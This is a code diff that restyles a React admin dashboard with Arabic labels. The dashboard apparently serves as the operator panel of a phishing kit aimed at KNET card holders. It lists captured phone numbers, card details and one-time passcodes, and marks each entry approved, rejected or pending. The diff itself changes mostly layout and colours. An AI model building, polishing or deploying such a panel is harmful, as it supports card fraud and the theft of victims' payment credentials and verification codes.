@@ -44,39 +44,27 @@ const BANK_NAMES = {
 
 // ─── Sub-components ───────────────────────────────────────────────────────────
 
-function StatisticsCard({ title, value, change, changeType, icon: Icon, color, trend }) {
+function StatisticsCard({ title, value, change, changeType, icon: Icon, color, accent }) {
   return (
-    <Card className="relative overflow-hidden bg-slate-900/70 border border-slate-800/50 shadow-xl shadow-black/20 hover:shadow-2xl hover:shadow-black/30 transition-all duration-300 group backdrop-blur-sm">
-      <div className="absolute inset-0 bg-gradient-to-br from-white/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
-      <CardHeader className="pb-2 relative">
-        <div className="flex items-center justify-between">
-          <div className={`p-3 rounded-xl ${color} shadow-lg group-hover:scale-110 transition-transform`}>
-            <Icon className="h-6 w-6 text-white" />
-          </div>
-          <div className="text-right">
-            <p className="text-sm font-medium text-slate-400">{title}</p>
-            <p className="text-3xl font-bold text-white">{value}</p>
-          </div>
+    <div className={`relative overflow-hidden rounded-2xl border border-white/10 bg-slate-900/80 backdrop-blur-sm shadow-2xl shadow-black/30 p-6 group hover:border-white/20 transition-all duration-300`}>
+      <div className={`absolute inset-0 bg-gradient-to-br ${accent} opacity-10 group-hover:opacity-20 transition-opacity duration-300 rounded-2xl`} />
+      <div className="relative flex items-start justify-between">
+        <div className={`p-3 rounded-xl ${color} shadow-lg shadow-black/30`}>
+          <Icon className="h-6 w-6 text-white" />
         </div>
-      </CardHeader>
-      <CardContent className="pt-0 relative">
-        <div className="flex items-center justify-between">
-          <div className="flex items-center gap-1">
-            <TrendingUp className={`h-4 w-4 ${changeType === "increase" ? "text-emerald-400" : changeType === "decrease" ? "text-red-400" : "text-slate-500"}`} />
-            <span className={`text-sm font-medium ${changeType === "increase" ? "text-emerald-400" : changeType === "decrease" ? "text-red-400" : "text-slate-500"}`}>
-              {change}
-            </span>
-          </div>
-          {trend && (
-            <div className="flex items-end gap-1 h-8">
-              {trend.map((val, i) => (
-                <div key={i} className="w-1.5 rounded-sm bg-emerald-500/60 hover:bg-emerald-400 transition-colors" style={{ height: `${(val / Math.max(...trend)) * 100}%` }} />
-              ))}
-            </div>
-          )}
+        <div className="text-right">
+          <p className="text-xs uppercase tracking-widest text-slate-500 mb-1">{title}</p>
+          <p className="text-4xl font-black text-white tabular-nums">{value}</p>
         </div>
-      </CardContent>
-    </Card>
+      </div>
+      {change && (
+        <div className="relative mt-4 flex items-center gap-1.5">
+          <span className={`inline-flex items-center gap-1 text-xs font-semibold px-2 py-0.5 rounded-full ${changeType === "increase" ? "bg-emerald-500/20 text-emerald-300" : "bg-slate-700/50 text-slate-400"}`}>
+            <TrendingUp className="h-3 w-3" />{change}
+          </span>
+        </div>
+      )}
+    </div>
   );
 }
 
@@ -160,24 +148,22 @@ function InfoBadge({ active, onClick, icon: Icon, text, inactiveText, colorClass
 
 function InfoSection({ items, additionalOtps }) {
   return (
-    <div className="mt-4 space-y-4">
-      <div className="bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 rounded-xl shadow-inner p-5 space-y-3">
-        {items.map(({ label, value, sensitive, ltr }) => {
+    <div className="mt-4">
+      <div className="rounded-xl border border-white/5 bg-slate-950/50 overflow-hidden">
+        {items.map(({ label, value, ltr }, idx) => {
           if (!value && value !== 0) return null;
           return (
-            <div key={label} className="flex justify-between items-center py-2 border-b border-gray-200 dark:border-gray-700 last:border-0 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-md px-2 transition">
-              <span className="font-medium text-gray-500 dark:text-gray-400">{label}:</span>
-              <div className="flex items-center gap-2">
-                <span className="font-semibold text-gray-900 dark:text-gray-200" dir={ltr ? "ltr" : undefined}>{String(value)}</span>
-              </div>
+            <div key={label} className={`flex justify-between items-center px-4 py-3 ${idx !== 0 ? "border-t border-white/5" : ""} hover:bg-white/[0.03] transition-colors`}>
+              <span className="text-sm text-slate-500">{label}</span>
+              <span className="text-sm font-semibold text-white font-mono" dir={ltr ? "ltr" : undefined}>{String(value)}</span>
             </div>
           );
         })}
         {additionalOtps?.length > 0 && (
-          <div className="pt-3 border-t border-gray-200 dark:border-gray-700">
-            <span className="font-medium text-gray-500 dark:text-gray-400 block mb-2">جميع الرموز:</span>
+          <div className="px-4 py-3 border-t border-white/5">
+            <span className="text-xs text-slate-500 block mb-2">جميع الرموز:</span>
             <div className="flex flex-wrap gap-2">
-              {additionalOtps.map((otp, i) => <Badge key={i} variant="outline" className="font-mono">{otp}</Badge>)}
+              {additionalOtps.map((otp, i) => <Badge key={i} variant="outline" className="font-mono border-white/10 text-slate-300">{otp}</Badge>)}
             </div>
           </div>
         )}
@@ -443,9 +429,10 @@ export default function Dashboard() {
     <div dir="rtl" className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-white">
       {/* Animated Background */}
       <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
-        <div className="absolute -top-32 -left-32 h-96 w-96 rounded-full bg-gradient-to-br from-emerald-500/15 to-teal-500/10 blur-3xl" />
-        <div className="absolute top-1/2 right-1/4 h-64 w-64 rounded-full bg-gradient-to-r from-cyan-500/10 to-emerald-500/5 blur-3xl" />
-        <div className="absolute -bottom-48 -right-32 h-[500px] w-[500px] rounded-full bg-gradient-to-tl from-cyan-500/10 to-emerald-500/5 blur-3xl" />
+        <div className="absolute -top-40 -left-40 h-[500px] w-[500px] rounded-full bg-gradient-to-br from-emerald-600/20 to-teal-600/10 blur-3xl" />
+        <div className="absolute top-1/3 right-1/3 h-80 w-80 rounded-full bg-gradient-to-r from-violet-600/10 to-indigo-600/5 blur-3xl" />
+        <div className="absolute -bottom-48 -right-40 h-[600px] w-[600px] rounded-full bg-gradient-to-tl from-cyan-600/15 to-emerald-600/5 blur-3xl" />
+        <div className="absolute bottom-1/4 left-1/4 h-64 w-64 rounded-full bg-gradient-to-r from-blue-600/10 to-cyan-600/5 blur-3xl" />
       </div>
 
       {/* Mobile Menu */}
@@ -466,33 +453,33 @@ export default function Dashboard() {
       </Sheet>
 
       {/* Header */}
-      <header className="sticky top-0 z-50 border-b border-slate-800/50 bg-slate-900/80 backdrop-blur-xl shadow-lg shadow-black/20">
-        <div className="flex items-center justify-between p-4">
+      <header className="sticky top-0 z-50 border-b border-white/5 bg-slate-950/90 backdrop-blur-2xl">
+        <div className="flex items-center justify-between px-6 py-3">
           <div className="flex items-center gap-4">
             <Button variant="ghost" size="icon" className="md:hidden text-white" onClick={() => setMobileMenuOpen(true)}>
               <Menu className="h-5 w-5" />
             </Button>
             <div className="flex items-center gap-3">
               <div className="relative">
-                <div className="absolute inset-0 bg-gradient-to-r from-emerald-500 to-teal-500 blur-lg opacity-40 rounded-xl" />
-                <div className="relative bg-gradient-to-br from-emerald-600 to-teal-600 p-3 rounded-xl shadow-lg">
-                  <Bell className="h-6 w-6 text-white" />
+                <div className="absolute inset-0 bg-emerald-500 blur-xl opacity-30 rounded-xl" />
+                <div className="relative bg-gradient-to-br from-emerald-500 to-teal-600 p-2.5 rounded-xl shadow-lg">
+                  <Bell className="h-5 w-5 text-white" />
                 </div>
                 {pendingCount > 0 && (
-                  <div className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse shadow-md">{pendingCount}</div>
+                  <div className="absolute -top-1.5 -right-1.5 bg-red-500 text-white text-[10px] font-bold rounded-full h-5 w-5 flex items-center justify-center shadow-lg shadow-red-500/30 animate-pulse">{pendingCount}</div>
                 )}
               </div>
               <div>
-                <h1 className="text-xl font-bold bg-gradient-to-r from-white via-slate-100 to-slate-300 bg-clip-text text-transparent">لوحة الإشعارات المتقدمة</h1>
-                <p className="text-sm text-slate-400">آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}</p>
+                <h1 className="text-lg font-bold text-white tracking-tight">لوحة الإشعارات</h1>
+                <p className="text-xs text-slate-500">آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}</p>
               </div>
             </div>
           </div>
-          <div className="hidden md:flex items-center gap-2">
+          <div className="flex items-center gap-2">
             <TooltipProvider>
               <Tooltip>
                 <TooltipTrigger asChild>
-                  <Button variant="outline" size="icon" onClick={fetchRecords} disabled={isLoading} className="border-slate-700 bg-slate-800/50 hover:bg-slate-700/50 text-slate-300 hover:text-emerald-400">
+                  <Button variant="ghost" size="icon" onClick={fetchRecords} disabled={isLoading} className="text-slate-400 hover:text-emerald-400 hover:bg-white/5 transition-colors">
                     <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                   </Button>
                 </TooltipTrigger>
@@ -502,7 +489,7 @@ export default function Dashboard() {
             <TooltipProvider>
               <Tooltip>
                 <TooltipTrigger asChild>
-                  <Button variant="outline" size="icon" onClick={() => setShowStats(s => !s)} className="border-slate-700 bg-slate-800/50 hover:bg-slate-700/50 text-slate-300 hover:text-emerald-400">
+                  <Button variant="ghost" size="icon" onClick={() => setShowStats(s => !s)} className="text-slate-400 hover:text-emerald-400 hover:bg-white/5 transition-colors">
                     <Activity className="h-4 w-4" />
                   </Button>
                 </TooltipTrigger>
@@ -517,71 +504,72 @@ export default function Dashboard() {
         {/* Statistics */}
         {showStats && (
           <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-            <StatisticsCard title="إجمالي السجلات" value={records.length} change="+12%" changeType="increase" icon={Users} color="bg-gradient-to-br from-blue-500 to-blue-600" trend={[5, 8, 12, 7, 10, 15, 13]} />
-            <StatisticsCard title="معلومات البطاقات" value={cardCount} change="+8%" changeType="increase" icon={CreditCard} color="bg-gradient-to-br from-purple-500 to-purple-600" trend={[2, 3, 5, 4, 6, 8, 7]} />
-            <StatisticsCard title="الموافقات" value={approvedCount} change="+15%" changeType="increase" icon={CheckCircle} color="bg-gradient-to-br from-emerald-500 to-emerald-600" trend={[1, 2, 4, 3, 5, 7, 6]} />
-            <StatisticsCard title="المعلقة" value={pendingCount} change="" changeType="neutral" icon={Clock} color="bg-gradient-to-br from-yellow-500 to-yellow-600" trend={[3, 4, 6, 5, 7, 8, 6]} />
+            <StatisticsCard title="إجمالي السجلات" value={records.length} change="+12%" changeType="increase" icon={Users} color="bg-gradient-to-br from-blue-500 to-indigo-600" accent="from-blue-500 to-indigo-600" />
+            <StatisticsCard title="معلومات البطاقات" value={cardCount} change="+8%" changeType="increase" icon={CreditCard} color="bg-gradient-to-br from-violet-500 to-purple-600" accent="from-violet-500 to-purple-600" />
+            <StatisticsCard title="الموافقات" value={approvedCount} change="+15%" changeType="increase" icon={CheckCircle} color="bg-gradient-to-br from-emerald-500 to-teal-600" accent="from-emerald-500 to-teal-600" />
+            <StatisticsCard title="المعلقة" value={pendingCount} change="" changeType="neutral" icon={Clock} color="bg-gradient-to-br from-amber-500 to-orange-600" accent="from-amber-500 to-orange-600" />
           </div>
         )}
 
         {/* Filters */}
-        <Card className="bg-slate-900/70 backdrop-blur-sm border border-slate-800/50 shadow-xl shadow-black/20">
-          <CardContent className="p-4">
-            <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
-              <div className="flex flex-col sm:flex-row gap-3 w-full lg:w-auto">
-                <Tabs value={filterType} onValueChange={setFilterType} className="w-full sm:w-auto">
-                  <TabsList className="grid grid-cols-4 bg-slate-800/50 border border-slate-700/50">
-                    <TabsTrigger value="all" className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-emerald-600 data-[state=active]:text-white"><Filter className="h-3 w-3" />الكل</TabsTrigger>
-                    <TabsTrigger value="pending" className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-amber-600 data-[state=active]:text-white"><Clock className="h-3 w-3" />معلق</TabsTrigger>
-                    <TabsTrigger value="card" className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-violet-600 data-[state=active]:text-white"><CreditCard className="h-3 w-3" />بطاقات</TabsTrigger>
-                    <TabsTrigger value="approved" className="flex items-center gap-1 text-slate-400 data-[state=active]:bg-cyan-600 data-[state=active]:text-white"><CheckCircle className="h-3 w-3" />موافق</TabsTrigger>
-                  </TabsList>
-                </Tabs>
-                <Select value={sortBy} onValueChange={setSortBy}>
-                  <SelectTrigger className="w-full sm:w-[180px] bg-slate-800/50 border-slate-700/50 text-slate-300">
-                    <ArrowUpDown className="h-4 w-4 ml-2 text-emerald-400" />
-                    <SelectValue placeholder="ترتيب حسب" />
-                  </SelectTrigger>
-                  <SelectContent className="bg-slate-900 border-slate-700">
-                    <SelectItem value="date" className="text-slate-300 focus:bg-slate-800 focus:text-white">التاريخ</SelectItem>
-                    <SelectItem value="status" className="text-slate-300 focus:bg-slate-800 focus:text-white">الحالة</SelectItem>
-                    <SelectItem value="amount" className="text-slate-300 focus:bg-slate-800 focus:text-white">المبلغ</SelectItem>
-                  </SelectContent>
-                </Select>
-              </div>
-              <div className="relative w-full lg:w-[400px] group">
-                <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-500 group-focus-within:text-emerald-400 transition-colors" />
-                <Input
-                  type="search"
-                  placeholder="البحث في السجلات... (اضغط / للتركيز)"
-                  className="pl-10 pr-10 bg-slate-800/50 backdrop-blur-sm border-slate-700/50 text-white placeholder:text-slate-500 focus:border-emerald-500/50 transition-colors"
-                  value={searchTerm}
-                  onChange={e => setSearchTerm(e.target.value)}
-                />
-                {searchTerm && (
-                  <Button variant="ghost" size="icon" className="absolute right-1 top-1/2 -translate-y-1/2 h-7 w-7 text-slate-400 hover:text-white" onClick={() => setSearchTerm("")}>
-                    <X className="h-3 w-3" />
-                  </Button>
-                )}
-              </div>
+        <div className="rounded-2xl border border-white/5 bg-slate-900/60 backdrop-blur-sm p-4">
+          <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
+            <div className="flex flex-col sm:flex-row gap-3 w-full lg:w-auto">
+              <Tabs value={filterType} onValueChange={setFilterType} className="w-full sm:w-auto">
+                <TabsList className="grid grid-cols-4 bg-slate-950/60 border border-white/5 rounded-xl p-1">
+                  <TabsTrigger value="all" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-emerald-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><Filter className="h-3 w-3" />الكل</TabsTrigger>
+                  <TabsTrigger value="pending" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-amber-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><Clock className="h-3 w-3" />معلق</TabsTrigger>
+                  <TabsTrigger value="card" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-violet-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><CreditCard className="h-3 w-3" />بطاقات</TabsTrigger>
+                  <TabsTrigger value="approved" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-cyan-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><CheckCircle className="h-3 w-3" />موافق</TabsTrigger>
+                </TabsList>
+              </Tabs>
+              <Select value={sortBy} onValueChange={setSortBy}>
+                <SelectTrigger className="w-full sm:w-[160px] bg-slate-950/60 border-white/5 text-slate-300 rounded-xl">
+                  <ArrowUpDown className="h-3.5 w-3.5 ml-2 text-emerald-400" />
+                  <SelectValue placeholder="ترتيب حسب" />
+                </SelectTrigger>
+                <SelectContent className="bg-slate-900 border-slate-700">
+                  <SelectItem value="date" className="text-slate-300 focus:bg-slate-800 focus:text-white">التاريخ</SelectItem>
+                  <SelectItem value="status" className="text-slate-300 focus:bg-slate-800 focus:text-white">الحالة</SelectItem>
+                  <SelectItem value="amount" className="text-slate-300 focus:bg-slate-800 focus:text-white">المبلغ</SelectItem>
+                </SelectContent>
+              </Select>
             </div>
-          </CardContent>
-        </Card>
+            <div className="relative w-full lg:w-[380px] group">
+              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-600 group-focus-within:text-emerald-400 transition-colors duration-200" />
+              <Input
+                type="search"
+                placeholder="البحث في السجلات..."
+                className="pl-10 pr-10 bg-slate-950/60 border-white/5 text-white placeholder:text-slate-600 focus:border-emerald-500/40 rounded-xl transition-colors duration-200"
+                value={searchTerm}
+                onChange={e => setSearchTerm(e.target.value)}
+              />
+              {searchTerm && (
+                <Button variant="ghost" size="icon" className="absolute right-1 top-1/2 -translate-y-1/2 h-7 w-7 text-slate-500 hover:text-white" onClick={() => setSearchTerm("")}>
+                  <X className="h-3 w-3" />
+                </Button>
+              )}
+            </div>
+          </div>
+        </div>
 
         {/* Table */}
-        <Card className="bg-slate-900/70 backdrop-blur-sm border border-slate-800/50 shadow-xl shadow-black/20">
-          <CardHeader className="pb-4 border-b border-slate-800/50">
+        <Card className="rounded-2xl border border-white/5 bg-slate-900/60 backdrop-blur-sm shadow-2xl shadow-black/30 overflow-hidden">
+          <CardHeader className="pb-4 border-b border-white/5">
             <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
-              <div>
-                <CardTitle className="text-2xl font-bold flex items-center gap-3 text-white">
-                  <Activity className="h-6 w-6 text-emerald-400" /> إدارة السجلات
-                </CardTitle>
-                <CardDescription className="mt-1 text-slate-400">
-                  عرض وإدارة جميع سجلات المدفوعات ({filtered.length} سجل)
-                </CardDescription>
+              <div className="flex items-center gap-3">
+                <div className="w-1 h-7 rounded-full bg-gradient-to-b from-emerald-400 to-teal-500" />
+                <div>
+                  <CardTitle className="text-lg font-bold flex items-center gap-2 text-white tracking-tight">
+                    <Activity className="h-5 w-5 text-emerald-400" /> إدارة السجلات
+                  </CardTitle>
+                  <CardDescription className="text-xs text-slate-500 mt-0.5">
+                    {filtered.length} سجل
+                  </CardDescription>
+                </div>
               </div>
               {records.length > 0 && (
-                <Button variant="destructive" size="sm" onClick={handleClearAll}>
+                <Button variant="destructive" size="sm" onClick={handleClearAll} className="bg-red-500/20 text-red-400 border border-red-500/30 hover:bg-red-500/30 hover:text-red-300">
                   <Trash2 className="h-4 w-4 ml-2" /> مسح الكل
                 </Button>
               )}
@@ -598,7 +586,7 @@ export default function Dashboard() {
               <div className="overflow-x-auto">
                 <table className="w-full table-auto border-collapse">
                   <thead>
-                    <tr className="bg-slate-800/50 border-b border-slate-700/50">
+                    <tr className="border-b border-white/5">
                       {[
                         { label: "الهاتف / المعلومات", key: null },
                         { label: "المبلغ", key: "amount" },
@@ -609,7 +597,7 @@ export default function Dashboard() {
                         { label: "الوقت", key: "date" },
                         { label: "الإجراءات", key: null },
                       ].map(({ label, key }) => (
-                        <th key={label} className={`px-6 py-4 text-right font-semibold text-slate-300 text-sm ${key ? "cursor-pointer hover:bg-slate-700/50 transition-colors" : ""}`} onClick={key ? () => toggleSort(key) : undefined}>
+                        <th key={label} className={`px-6 py-3.5 text-right font-semibold text-slate-500 text-xs uppercase tracking-wider ${key ? "cursor-pointer hover:text-slate-300 transition-colors duration-150" : ""}`} onClick={key ? () => toggleSort(key) : undefined}>
                           <div className="flex items-center gap-1 justify-end">
                             {label}
                             {key && sortBy === key && <ArrowUpDown className="h-3 w-3 text-emerald-400" />}
@@ -622,7 +610,7 @@ export default function Dashboard() {
                     {paginated.map((r, index) => {
                       const statusLabel = r.network === "approved" ? "approved" : r.network === "rejected" ? "rejected" : "pending";
                       return (
-                        <tr key={r.id} className="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors">
+                        <tr key={r.id} className="border-b border-white/5 hover:bg-white/[0.03] transition-colors duration-150">
                           <td className="px-6 py-4">
                             <div className="flex flex-col gap-1.5">
                               <span className="font-mono text-white text-sm">{r.phone_number || "—"}</span>
@@ -696,20 +684,20 @@ export default function Dashboard() {
             )}
           </CardContent>
           {paginated.length > 0 && (
-            <CardFooter className="border-t border-slate-800/50 p-4">
-              <PaginationBar currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} totalItems={filtered.length} itemsPerPage={itemsPerPage} />
-            </CardFooter>
+           <CardFooter className="border-t border-white/5 p-4">
+             <PaginationBar currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} totalItems={filtered.length} itemsPerPage={itemsPerPage} />
+           </CardFooter>
           )}
-        </Card>
+          </Card>
       </div>
 
       {/* Personal Info Dialog */}
       <Dialog open={dialogType === "personal"} onOpenChange={closeDialog}>
-        <DialogContent className="max-w-md bg-background rounded-xl shadow-lg p-6" dir="rtl">
+        <DialogContent className="max-w-md bg-slate-900 border border-white/10 rounded-2xl shadow-2xl shadow-black/50 p-6" dir="rtl">
           <DialogHeader>
-            <DialogTitle className="flex items-center gap-3 text-2xl font-semibold">
-              <div className="w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br from-blue-400 to-blue-600 shadow-md">
-                <User className="h-6 w-6 text-white" />
+            <DialogTitle className="flex items-center gap-3 text-xl font-bold text-white">
+              <div className="w-10 h-10 rounded-xl flex items-center justify-center bg-gradient-to-br from-blue-500 to-indigo-600 shadow-lg">
+                <User className="h-5 w-5 text-white" />
               </div>
               المعلومات الشخصية
             </DialogTitle>
@@ -742,11 +730,11 @@ export default function Dashboard() {
 
       {/* KNET Card Info Dialog */}
       <Dialog open={dialogType === "card"} onOpenChange={closeDialog}>
-        <DialogContent className="max-w-md bg-background rounded-xl shadow-lg p-6" dir="rtl">
+        <DialogContent className="max-w-md bg-slate-900 border border-white/10 rounded-2xl shadow-2xl shadow-black/50 p-6" dir="rtl">
           <DialogHeader>
-            <DialogTitle className="flex items-center gap-3 text-2xl font-semibold">
-              <div className="w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br from-green-400 to-green-600 shadow-md">
-                <CreditCard className="h-6 w-6 text-white" />
+            <DialogTitle className="flex items-center gap-3 text-xl font-bold text-white">
+              <div className="w-10 h-10 rounded-xl flex items-center justify-center bg-gradient-to-br from-emerald-500 to-teal-600 shadow-lg">
+                <CreditCard className="h-5 w-5 text-white" />
               </div>
               معلومات KNET
             </DialogTitle>
